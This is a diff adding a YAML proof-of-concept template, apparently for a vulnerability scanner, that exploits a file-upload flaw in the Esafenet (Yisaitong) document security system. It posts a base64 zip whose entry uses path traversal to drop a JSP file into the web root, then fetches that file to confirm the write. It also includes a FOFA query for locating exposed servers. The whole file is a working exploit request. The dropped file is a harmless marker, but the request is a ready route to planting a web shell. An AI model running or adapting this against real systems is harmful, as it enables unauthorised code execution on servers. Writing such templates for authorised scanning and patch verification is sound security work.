@@ -1,0 +1,31 @@
+id: poc-yaml-yisaitong-esafenet-hiddenWatermark-file-upload
+info:
+  name: 亿赛通电子文档安全管理系统 hiddenWatermark 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 亿赛通电子文档安全管理系统
+  fofa: app="亿赛通-电子文档安全管理系统"
+variables:
+  t1: base64_decode("UEsDBBQAAAAIAAAAIQD5T26PZgAAAHAAAAAVAAAALi4vLi4vLi4vanMvY2VzaGkuanNwHcgxDsIwDAXQnVOESpXixRcoYkSMCAZmq/0CIysOqVuuD2V879Dvki/BtWkJK7k7w8zT3ZtN+46Ggk96ySqszic1ZKnVdJRQL/xAXCF2kXjmhveCOba7oa2G+DcR8YSfkGlI/fELUEsDBBQAAAAIAAAAIQDGTjiHSQAAAGcAAAAWAAAAdGhlbWUvdGhlbWUvdGhlbWUxLnhtbLNR1NWtVnLLzEn1S8xNVbJSSkxMVNIBCwRnVoEEjIyMgAKhxalFcBVAvktqQWJRSW5qXglMBKTC0wXGK8kEqzU0Mlaq1dW1AwBQSwECFAAUAAAACAAAACEA+U9uj2YAAABwAAAAFQAAAAAAAAAAAAAAgAEAAAAALi4vLi4vLi4vanMvY2VzaGkuanNwUEsBAhQAFAAAAAgAAAAhAMZOOIdJAAAAZwAAABYAAAAAAAAAAAAAAIABmQAAAHRoZW1lL3RoZW1lL3RoZW1lMS54bWxQSwUGAAAAAAIAAgCHAAAAFgEAAAAA")
+  t2: random_str(5)
+requests:
+- method: POST
+  path: /CDGServer3/hiddenWatermark/uploadFile
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycfadsmat
+  data: '------WebKitFormBoundarycfadsmat
+
+    Content-Disposition: form-data; name="doc"; filename="{{.t2}}.zip"
+
+    Content-Type: application/zip
+
+
+    {{.t1}}
+
+    ------WebKitFormBoundarycfadsmat--'
+  expression: status_code == 200
+- method: GET
+  path: /CDGServer3/js/ceshi.jsp
+  expression: status_code == 200 && contains(body,"Hello World!") && !contains(body,"<")
+transport: http
